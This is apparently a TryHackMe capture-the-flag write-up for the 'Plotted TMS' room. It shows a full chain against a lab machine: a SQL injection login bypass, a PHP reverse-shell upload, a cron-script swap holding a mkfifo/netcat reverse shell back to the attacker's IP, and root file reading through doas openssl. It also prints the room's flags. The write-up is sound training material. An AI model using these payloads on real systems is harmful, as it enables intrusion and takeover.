# TryHackMe — Plotted TMS Writeup

## Enumeration

Kicked things off with the usual nmap scan:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/plotted-tms]
└─$ nmap -Pn -sV -A -T4  10.48.160.83
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-29 13:51 -0400
Nmap scan report for 10.48.160.83
Host is up (0.036s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
```

Three ports: SSH on 22, and Apache serving HTTP on both 80 *and* 445, which is a fun little curveball since 445 usually means SMB. Not here though — straight up HTTP.

Port 80 just gives the stock Apache2 Ubuntu default page, so nothing to see on the surface. Time for dirsearch.

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/plotted-tms]
└─$ dirsearch -u http://10.48.160.83
...
[13:54:56] 301 -  312B  - /admin  ->  http://10.48.160.83/admin/
[13:54:56] 200 -  453B  - /admin/
[13:55:34] 200 -   25B  - /passwd
```

`/admin/` gives us a directory listing with a single file sitting in it: `id_rsa`. Now normally an exposed `id_rsa` would have me doing a little happy dance, but this box wasn't going to make it that easy.

## Trolled by the box author

Grabbed the contents of `id_rsa`:

```
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4uZ2V0IGJhY2sgdG8gZW51bWVyYXRpb24gOkQ=
```

That's clearly not a private key, it's base64. Threw it into CyberChef and got:

```
Trust me it is not this easy..now get back to enumeration :D
```

Anddd we got trolled. Fair enough. Checked the other lead, `/passwd`:

```
bm90IHRoaXMgaXMgZWFzeSA=
```

Decoded that too:

```
not this easy :D
```

Same energy. Alright, box author has jokes — noted, moving on to actually enumerating properly.

## Finding the real app on port 445

Ran dirsearch again, this time against port 445 since that's the other web service:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/plotted-tms]
└─$ dirsearch -u http://10.48.160.83:445
...
[13:58:28] 301 -  322B  - /management  ->  http://10.48.160.83:445/management/
[13:58:29] 200 -    4KB - /management/
```

`/management/` leads to a login page for a "Traffic Offense Management System" (TOMS) — admin login panel, username and password fields, a "Go to Portal" link, "Sign In" button. Classic custom PHP app vibes, which usually means classic custom PHP app vulnerabilities.

## SQL injection on the login form

First thing I try on any login form like this: the tried and true auth bypass payload. Dropped this into the username field:

```
admin' OR 1=1;--
```

...with any junk in the password field, and hit Sign In.

Anddd we're in! Straight into the admin dashboard as "Administrator Admin" — no input sanitization whatsoever on that login query, textbook SQL injection auth bypass.

The dashboard shows:

- Today's Offences: 0
- Total Driver's Listed: 1
- Total Traffic Offenses: 2

And a full nav menu: Dashboard, Offense Records, Drivers List, Reports, and under Maintenance: Offenses List, User List, Settings.

## From admin panel to shell — arbitrary file upload

Poked around the app looking for anything that lets us push a file to the server, and the Settings page delivers. There's a "System Logo" upload field under system info settings, with a Browse button and no visible extension filtering on the front end.

Grabbed the classic pentestmonkey PHP reverse shell that ships with Kali:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/plotted-tms]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
┌──(lightningf4st㉿kali)-[~/Tryhackme/plotted-tms]
└─$ nano php-reverse-shell.php
```

Edited it to point back at my IP and port, uploaded it as the System Logo, and set up a listener:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/plotted-tms]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.140.36] from (UNKNOWN) [10.48.160.83] 55444
Linux plotted 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Anddd we got a shell as `www-data`! Upgraded to a proper TTY the usual way:

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm
```

(with the standard `Ctrl+Z`, `stty raw -echo; fg` combo on the attacker side to get a fully interactive shell)

## Privesc to plot_admin — abusing a writable cron script

Had a look around `/home`:

```
www-data@plotted:/home$ ls -al
drwxr-xr-x  4 plot_admin plot_admin 4096 Oct 28  2021 plot_admin
drwxr-xr-x  4 ubuntu     ubuntu     4096 Oct 28  2021 ubuntu
```

`plot_admin`'s home has a `user.txt` sitting right there, but of course it's not readable by `www-data`:

```
www-data@plotted:/home/plot_admin$ cat user.txt
cat: user.txt: Permission denied
```

Standard next move on a CTF box — check for cron jobs:

```
www-data@plotted:/home/plot_admin$ cat /etc/crontab
...
* * 	* * *	plot_admin /var/www/scripts/backup.sh
```

There it is — `plot_admin` runs `/var/www/scripts/backup.sh` **every single minute**. Checked the permissions on the script and its parent directory:

```
www-data@plotted:/home/plot_admin$ ls -al /var/www/scripts/backup.sh
-rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28  2021 /var/www/scripts/backup.sh
```

The script itself is owned by `plot_admin` and I can't write to it directly as `www-data`. But the directory it lives in is a different story:

```
www-data@plotted:/var/www/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.140.36 1235 >/tmp/f" >> /var/www/scripts/test.sh
www-data@plotted:/var/www/scripts$ rm backup.sh
rm: remove write-protected regular file 'backup.sh'? y
www-data@plotted:/var/www/scripts$ mv test.sh backup.sh
www-data@plotted:/var/www/scripts$ chmod +x backup.sh
```

Since `www-data` has write access on the `/var/www/scripts` directory itself, I could delete the original `backup.sh` outright and drop in my own version containing a reverse shell one-liner, then re-add the execute bit. Cron doesn't care who wrote the file, it just runs it as `plot_admin` on schedule.

Set up a listener and waited for the minute to tick over:

```
┌──(lightningf4st㉿kali)-[~/Tryhackme/plotted-tms]
└─$ nc -nvlp 1235
listening on [any] 1235 ...
connect to [192.168.140.36] from (UNKNOWN) [10.48.160.83] 50088
$ /bin/bash -i
plot_admin@plotted:~$ whoami
plot_admin
```

Anddd we're `plot_admin`! Grabbed the user flag:

```
plot_admin@plotted:~$ cat user.txt
77927510d5edacea1f9e86602f1fbadb
```

**USER FLAG: 77927510d5edacea1f9e86602f1fbadb**

## Root time — doas + openssl file read

SUID hunting time:

```
plot_admin@plotted:~$ find / -type f -perm -04000 2>/dev/null
...
/usr/bin/doas
```

`doas` is the OpenBSD alternative to `sudo`, and it's SUID here. Naturally I went looking for its config:

```
plot_admin@plotted:~$ cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl
```

`plot_admin` can run `openssl` as root, no password required. `openssl` is a well-known GTFOBins entry for privesc — it can be abused to read arbitrary files via its `enc` subcommand, since it'll happily read and "encrypt" (effectively just cat, when combined with no real encryption) anything you point it at, root privileges and all:

```
plot_admin@plotted:~$ doas openssl enc -in /root/root.txt
Congratulations on completing this room!

53f85e2da3e874426fa059040a9bdcab

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```

Anddd we got root!

**ROOT FLAG: 53f85e2da3e874426fa059040a9bdcab**

Thanks for reading!
